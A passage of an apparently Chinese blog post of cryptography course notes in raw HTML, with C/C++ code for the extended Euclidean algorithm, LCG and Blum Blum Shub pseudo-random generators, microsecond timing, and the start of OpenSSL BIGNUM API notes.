class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">extgcd</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> a, <span class="type">unsigned</span> <span class="type">int</span> b, <span class="type">int</span> &amp;x, <span class="type">int</span> &amp;y)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(a==<span class="number">0</span>)&#123;</span><br><span class="line">        x = <span class="number">0</span>;</span><br><span class="line">        y = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">extgcd</span>(b%a,a,x,y);</span><br><span class="line">    <span class="type">int</span> t = x;</span><br><span class="line">    x = y - b/a*x;</span><br><span class="line">    y = t;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">unsigned</span> <span class="type">int</span> <span class="title">gcd</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> a, <span class="type">unsigned</span> <span class="type">int</span> b)</span></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(a%b == <span class="number">0</span>)&#123;</span><br><span class="line"><span class="keyword">return</span> b;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="built_in">gcd</span>(b,a%b);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">reverse</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> a, <span class="type">unsigned</span> <span class="type">int</span> n)</span></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(!a||!n||<span class="built_in">gcd</span>(a,n)!=<span class="number">1</span>)&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> x,y;</span><br><span class="line"><span class="built_in">extgcd</span>(a,n,x,y);</span><br><span class="line"><span class="keyword">return</span> x%n;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>考试之前记得记一记。</p><h1>伪随机数生成器</h1><p>随机数具有随机性：<strong>均匀分布</strong>、<strong>难以重现</strong>，机器生成的一般时伪随机数。伪随机数生成器通过种子和确定性算法，生成不断迭代的伪随机序列，具有<strong>伪随机性</strong>、<strong>可重现</strong></p><img src="http://cdn.blog-blockchain.xyz/202211230842387.png" alt="image-20221123084155703" style="zoom: 50%;" /><p>一般 C 语言生成随机数都是先 <code>srand(seed)</code> 设置种子，最常见的是 <code>srand(time(NULL))</code></p><h2 id="LCG">LCG</h2><p>线性同余伪随机数生成器的基本结构是</p><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><msub><mi>x</mi><mrow><mi>i</mi><mo>+</mo><mn>1</mn></mrow></msub><mo>=</mo><mi>a</mi><msub><mi>x</mi><mi>i</mi></msub><mo>+</mo><mi>c</mi><mtext> </mtext><mtext> </mtext><mtext> </mtext><mo lspace="0.22em" rspace="0.22em"><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow></mo><mtext> </mtext><mi>m</mi></mrow><annotation encoding="application/x-tex">x_{i+1}=ax_i+c\,\,\bmod m</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6389em;vertical-align:-0.2083em;"></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mbin mtight">+</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2083em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.7333em;vertical-align:-0.15em;"></span><span class="mord mathnormal">a</span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal">c</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mspace" style="margin-right:0.0556em;"></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin"><span class="mord"><span class="mord mathrm">mod</span></span></span><span class="mspace" style="margin-right:0.0556em;"></span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">m</span></span></span></span></span></p><ul><li>a 叫做乘数</li><li>c 叫做增量。</li><li>m 叫做模数。</li><li><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>x</mi><mn>0</mn></msub></mrow><annotation encoding="application/x-tex">x_0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5806em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> 初始值叫做种子。</li></ul><p>它生成的伪随机数具备以下性质：</p><ol><li>不具备全周期性质。循环的长度不一定为 m-1，可能生成的随机数只有少数几个。</li><li>容易根据之前的随机数 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>x</mi><mn>0</mn></msub><mo separator="true">,</mo><msub><mi>x</mi><mn>1</mn></msub><mo separator="true">,</mo><mo>⋯</mo><mtext> </mtext><mo separator="true">,</mo><msub><mi>x</mi><mrow><mi>i</mi><mo>−</mo><mn>1</mn></mrow></msub></mrow><annotation encoding="application/x-tex">x_0,x_1,\cdots,x_{i-1}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6389em;vertical-align:-0.2083em;"></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner">⋯</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mbin mtight">−</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2083em;"><span></span></span></span></span></span></span></span></span></span> 推断出 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>x</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">x_i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5806em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></li></ol><p>所以线性同余位随机数生成器不具备<strong>可证明的安全性</strong>，可证明安全性指的是 <em>可以将区分伪随机数和随机数规约为解决数学难题</em></p><h2 id="BBS">BBS</h2><p>BBS (Blum Blum Shub) 伪随机数生成器具备可证明安全性，基于<strong>大数难分解</strong>困难问题（给定 n，无法确定 n 的因子），结构如下：</p><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><msub><mi>x</mi><mi>i</mi></msub><mo>=</mo><msubsup><mi>x</mi><mrow><mi>i</mi><mo>−</mo><mn>1</mn></mrow><mn>2</mn></msubsup><mtext> </mtext><mo lspace="0.22em" rspace="0.22em"><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow></mo><mtext> </mtext><mi>n</mi><mspace linebreak="newline"></mspace><mrow><mo fence="true">{</mo><mtable rowspacing="0.36em" columnalign="left left" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mtext> </mtext><mtext> </mtext><mi>n</mi><mo>=</mo><mi>p</mi><mi>q</mi><mo separator="true">,</mo><mi>p</mi><mo>≡</mo><mi>q</mi><mo>≡</mo><mn>3</mn><mtext> </mtext><mo lspace="0.22em" rspace="0.22em"><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow></mo><mtext> </mtext><mn>4</mn></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><msub><mi>x</mi><mn>0</mn></msub><mo>=</mo><mi>s</mi><mo separator="true">,</mo><mrow><mi mathvariant="normal">g</mi><mi mathvariant="normal">c</mi><mi mathvariant="normal">d</mi></mrow><mrow><mo fence="true">(</mo><mi>s</mi><mo separator="true">,</mo><mi mathvariant="normal">n</mi><mo fence="true">)</mo></mrow><mo>=</mo><mn>1</mn></mrow></mstyle></mtd></mtr></mtable></mrow></mrow><annotation encoding="application/x-tex">x_i=x_{i-1}^{2}\bmod n \\\begin{cases}\,\,n=pq, p\equiv q\equiv 3\bmod 4\\x_0=s,\mathrm{gcd}\left( s,\mathrm{n} \right) =1\\\end{cases}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5806em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1.1694em;vertical-align:-0.3053em;"></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8641em;"><span style="top:-2.453em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mbin mtight">−</span><span class="mord mtight">1</span></span></span></span><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.3053em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.0556em;"></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin"><span class="mord"><span class="mord mathrm">mod</span></span></span><span class="mspace" style="margin-right:0.0556em;"></span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:3em;vertical-align:-1.25em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;"><span class="delimsizing size4">{</span></span><span class="mord"><span class="mtable"><span class="col-align-l"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.69em;"><span style="top:-3.69em;"><span class="pstrut" style="height:3.008em;"></span><span class="mord"><span class="mspace" style="margin-right:0.1667em;"></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">pq</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mord">3</span><span class="mspace" style="margin-right:0.0556em;"></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin"><span class="mord"><span class="mord mathrm">mod</span></span></span><span class="mspace" style="margin-right:0.0556em;"></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord">4</span></span></span><span style="top:-2.25em;"><span class="pstrut" style="height:3.008em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mord mathnormal">s</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathrm">gcd</span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">(</span><span class="mord mathnormal">s</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathrm">n</span><span class="mclose delimcenter" style="top:0em;">)</span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mord">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.19em;"><span></span></span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span></span></p><p>然后从 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>x</mi><mn>0</mn></msub><mo separator="true">,</mo><msub><mi>x</mi><mn>1</mn></msub><mo separator="true">,</mo><mo>⋯</mo><mtext> </mtext><mo separator="true">,</mo><msub><mi>x</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">x_0,x_1,\cdots,x_i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner">⋯</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> 中每个数选择重要的比特位（比如最低位、奇校验位、偶校验位），然后组成了一个 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>i</mi><mo>+</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">i+1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7429em;vertical-align:-0.0833em;"></span><span class="mord mathnormal">i</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1</span></span></span></span> 位的二进制序列。注意 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>x</mi><mn>0</mn></msub></mrow><annotation encoding="application/x-tex">x_0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5806em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> 是最高位。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">unsigned</span> <span class="type">int</span> <span class="title">least_bit</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> n)</span></span>&#123;</span><br><span class="line"><span class="keyword">return</span> n&amp;<span class="number">0x0001</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">unsigned</span> <span class="type">int</span> <span class="title">even_check_bit</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> n)</span></span>&#123;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> cnt = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">while</span>(n!=<span class="number">0</span>)&#123;</span><br><span class="line">cnt+=n%<span class="number">2</span>;</span><br><span class="line">n /=<span class="number">2</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(cnt%<span class="number">2</span>==<span class="number">0</span>)&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">unsigned</span> <span class="type">int</span> <span class="title">odd_check_bit</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> n)</span></span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span> - <span class="built_in">even_check_bit</span>(n);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">unsigned</span> <span class="type">int</span> <span class="title">bbs</span><span class="params">(<span class="type">int</span> flag)</span></span>&#123;</span><br><span class="line"><span class="type">unsigned</span> p,q,n,s,res;</span><br><span class="line">p=<span class="number">11</span>,q=<span class="number">19</span>,s=<span class="number">3</span>,n=p*q;</span><br><span class="line">res = <span class="number">0</span>;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> i;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">32</span>;i++)&#123;</span><br><span class="line">s = (s%n)*(s%n)%n;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> b;</span><br><span class="line"><span class="keyword">switch</span>(flag)&#123;</span><br><span class="line"><span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">b = <span class="built_in">least_bit</span>(s);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">b = <span class="built_in">odd_check_bit</span>(s) ;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">b = <span class="built_in">even_check_bit</span>(s);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">res=res*<span class="number">2</span>;</span><br><span class="line">res+= b;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>另外，这里老师还介绍了微秒级别的获取时间的函数 <code>gettimeofday</code>，主要记得它的参数类型是 <code>struct timeval</code>：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">timeval</span> start,end;</span><br><span class="line"><span class="built_in">gettimeofday</span>(&amp;start,<span class="literal">NULL</span>);</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> a = (<span class="type">unsigned</span> <span class="type">int</span>)<span class="number">-1</span>;</span><br><span class="line">cout&lt;&lt;<span class="built_in">bbs</span>(<span class="number">0</span>)&lt;&lt;endl;</span><br><span class="line">cout&lt;&lt;<span class="built_in">bbs</span>(<span class="number">1</span>)&lt;&lt;endl;</span><br><span class="line">cout&lt;&lt;<span class="built_in">bbs</span>(<span class="number">2</span>)&lt;&lt;endl;</span><br><span class="line"><span class="built_in">gettimeofday</span>(&amp;end,<span class="literal">NULL</span>);</span><br><span class="line"><span class="type">float</span> time_use = (end.tv_sec - start.tv_sec) * <span class="number">1000000</span> + (end.tv_usec - start.tv_usec);</span><br><span class="line">cout&lt;&lt; time_use&lt;&lt;endl;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>不过，读者可以在 Linux 系统下用 <code>man</code> 命令获取相关信息。</p><h1>非对称密码</h1><p>从这一节开始，我们不再自己写算法，而是学会使用 <code>openssl</code> 库来实现密码学函数。</p><h2 id="大数运算">大数运算</h2><p>大数运算时最基础的 <code>openssl</code> 内容，用于处理任意大的整数。在此之前，请检查是否按照密码学库，运行 <code>sudo apt-get install libssl-dev</code>。编译时需要引入库：<code>gcc/g++ &lt;源文件&gt; -o &lt;可执行文件&gt; -lcrypto</code>。这里主要使用 <code>&lt;openssl/bn.h&gt;</code>。</p><h3 id="创建和释放">创建和释放</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">#<span class="keyword">include</span> <span class="string">&lt;openssl/bn.h&gt;</span></span></span><br><span class="line"><span class="comment">//返回一个初始化了的 BIGNUM 类型的对象的指针，失败返回 NULL</span></span><br><span class="line"> <span class="function">BIGNUM *<span class="title">BN_new</span><span class="params">(<span class="type">void</span>)</span></span>;</span><br><span class="line"><span class="comment">//初始化已经分配了内存的 BIGNUM</span></span><br><span class="line"> <span class="function"><span class="type">void</span> <span class="title">BN_init</span><span class="params">(BIGNUM *)</span></span>;</span><br><span class="line"><span class="comment">//不释放内存，但是将变量赋值0</span></span><br><span class="line"> <span class="function"><span class="type">void</span> <span class="title">BN_clear</span><span class="params">(BIGNUM *a)</span></span>;</span><br><span class="line"><span class="comment">//释放内存</span></span><br><span class="line"> <span class="function"><span class="type">void</span> <span class="title">BN_free</span><span class="params">(BIGNUM *a)</span></span>;</span><br><span class="line"></span><br><span class="line"> <span class="function"><span class="type">void</span> <span class="title">BN_clear_free</span><span class="params">(BIGNUM *a)</span></span>;</span><br></pre></td></tr></table></figure><p>下面是 <code>CTX</code> 也就是 context 类型，用于计算时暂存上下文，下面时创建和释放的方法。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;openssl/bn.h&gt;</span></span></span><br><span class="line"><span class="function">BN_CTX *<span class="title">BN_CTX_new</span><span class="params">(<span class="type">void</span>)</span></span>;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">BN_CTX_free</span><span class="params">(BN_CTX *c)</span></span>;</span><br></pre></td></tr></table></figure><h3 id="基本赋值">基本赋值</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">BN_zero</span><span class="params">(BIGNUM *a)</span></span>;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">BN_one</span><span class="params">(BIGNUM *a)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">BN_bn2bin</span><span class="params">(<span class="type">const</span> BIGNUM *a, <span class="type">unsigned</span> <span class="type">char</span> *to)</span></span>;</span><br><span class="line"><span class="function">BIGNUM *<span class="title">BN_bin2bn</span><span class="params">(<span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span> *s, <span class="type">int</span> len, BIGNUM *ret)</span></span>;</span><br><span class="line"><span class="function"><span class="type">char</span> *<span 